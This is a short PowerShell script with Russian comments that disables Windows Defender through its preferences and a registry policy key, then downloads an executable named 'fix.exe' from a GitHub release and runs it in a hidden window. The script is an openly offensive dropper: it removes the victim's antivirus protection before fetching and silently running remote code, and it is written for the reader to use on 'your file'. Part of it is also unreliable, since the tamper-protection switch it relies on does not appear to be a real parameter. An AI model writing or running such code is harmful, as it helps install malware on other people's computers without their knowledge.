# Сначала отключаем Tamper Protection (защиту от подделок)
# Без этого шага Defender просто проигнорирует наши команды
Set-MpPreference -DisableTamperProtection $true

# Теперь отключаем Defender через реестр (это самый надежный способ)
New-Item -Path "HKLM:\SOFTWARE\Policies\Microsoft\Windows Defender" -Force | Out-Null
Set-ItemProperty -Path "HKLM:\SOFTWARE\Policies\Microsoft\Windows Defender" -Name "DisableAntiSpyware" -Value 1

# Отключаем реальную защиту (Real-time Monitoring)
Set-MpPreference -DisableRealtimeMonitoring $true

# Проверяем, что Defender действительно отключен (опционально)
Get-MpComputerStatus | Select-Object AntivirusEnabled, RealTimeProtectionEnabled, TamperProtectionSource

# Скачиваем и запускаем твой файл
Invoke-WebRequest -Uri "https://github.com/kilordow/Fx.exe/releases/download/lol/fix.exe" -OutFile "fix.exe"
Start-Process -FilePath "fix.exe" -WindowStyle Hidden
